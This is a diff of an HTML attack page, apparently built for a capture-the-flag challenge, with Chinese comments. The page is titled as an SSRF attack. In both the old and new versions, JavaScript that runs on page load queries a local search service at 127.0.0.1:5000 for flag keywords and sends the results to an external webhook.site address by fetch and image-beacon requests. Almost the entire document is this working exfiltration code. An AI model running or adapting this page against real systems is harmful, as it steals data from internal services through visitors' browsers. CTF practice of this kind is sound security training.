@@ -1,97 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Search Engine Exploit</title>
+    <title>SSRF Attack Page</title>
 </head>
 <body>
-    <h1>Exploiting Search Engine...</h1>
-    <div id="results"></div>
+    <h1>SSRF Attack in Progress...</h1>
+    <div id="result"></div>
     
     <script>
-        const webhookUrl = 'https://webhook.site/23ec46e9-3d01-4059-9ddd-8b65ad743c9a';
-        const resultsDiv = document.getElementById('results');
-        
-        // 可能的 flag 關鍵字
-        const keywords = [
-            'flag', 'AIS3', 'fake', 'secret', 
-            'Flag', 'FLAG', 'ctf', 'CTF'
-        ];
-        
-        let foundResults = [];
-        
-        async function searchKeyword(keyword) {
-            try {
-                const response = await fetch(`http://127.0.0.1:5000/search?q=${keyword}`);
+        // 當頁面載入後，向目標伺服器發送請求
+        window.onload = function() {
+            // 嘗試搜尋包含 flag 的內容
+            // 使用 "flag" 作為搜尋關鍵字來找到包含 AIS3{fake_flag} 的句子
+            fetch('http://127.0.0.1:5000/search?q=flag')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('搜尋結果:', data);
+                    document.getElementById('result').innerHTML = JSON.stringify(data);
+                    
+                    // 將結果發送到攻擊者控制的伺服器
+                    // 在實際攻擊中，替換為您控制的伺服器
+                    fetch('https://webhook.site/23ec46e9-3d01-4059-9ddd-8b65ad743c9a?data=' + encodeURIComponent(JSON.stringify(data)), {
+                        method: 'GET',
+                        mode: 'no-cors'
+                    }).catch(e => console.log('外部請求失敗:', e));
+                })
+                .catch(error => {
+                    console.error('錯誤:', error);
+                    document.getElementById('result').innerHTML = 'Error: ' + error;
+                });
                 
-                if (response.ok) {
-                    const data = await response.json();
-                    resultsDiv.innerHTML += `<p>Keyword "${keyword}" found results!</p>`;
-                    foundResults.push({keyword, data});
-                    return data;
-                } else if (response.status === 302) {
-                    resultsDiv.innerHTML += `<p>Keyword "${keyword}" redirected (no results)</p>`;
-                    return null;
-                }
-            } catch (error) {
-                resultsDiv.innerHTML += `<p>Error searching "${keyword}": ${error}</p>`;
-                return null;
-            }
-        }
-        
-        // 依序搜尋每個關鍵字
-        async function exploitSearch() {
-            for (const keyword of keywords) {
-                await searchKeyword(keyword);
-                await new Promise(resolve => setTimeout(resolve, 100)); // 短暫延遲
-            }
-            
-            // 發送所有結果到 webhook
-            if (foundResults.length > 0) {
-                // 方法1: 使用 Image GET 請求
-                const img = new Image();
-                img.src = webhookUrl + '?results=' + encodeURIComponent(JSON.stringify(foundResults));
-                
-                // 方法2: 嘗試 POST
-                try {
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: {
-                            'Content-Type': 'text/plain',
-                        },
-                        body: JSON.stringify(foundResults)
+            // 也可以嘗試其他搜尋關鍵字
+            setTimeout(() => {
+                fetch('http://127.0.0.1:5000/search?q=AIS3')
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('AIS3 搜尋結果:', data);
+                        // 處理結果...
                     });
-                } catch (e) {
-                    console.log('POST failed:', e);
-                }
-                
-                resultsDiv.innerHTML += `<p>Sent ${foundResults.length} results to webhook!</p>`;
-            }
-        }
-        
-        // 開始攻擊
-        exploitSearch();
-        
-        // 備用方案：直接嘗試常見的 flag 格式搜尋
-        setTimeout(async () => {
-            const flagPatterns = [
-                'AIS3{', '}', 'fake_flag', 
-                'The flag is', 'flag is'
-            ];
-            
-            for (const pattern of flagPatterns) {
-                try {
-                    const response = await fetch(`http://127.0.0.1:5000/search?q=${encodeURIComponent(pattern)}`);
-                    if (response.ok) {
-                        const data = await response.json();
-                        const img = new Image();
-                        img.src = webhookUrl + '?pattern=' + encodeURIComponent(pattern) + '&result=' + encodeURIComponent(JSON.stringify(data));
-                    }
-                } catch (e) {
-                    console.log('Pattern search failed:', e);
-                }
-            }
-        }, 2000);
+            }, 1000);
+        };
     </script>
 </body>
 </html>
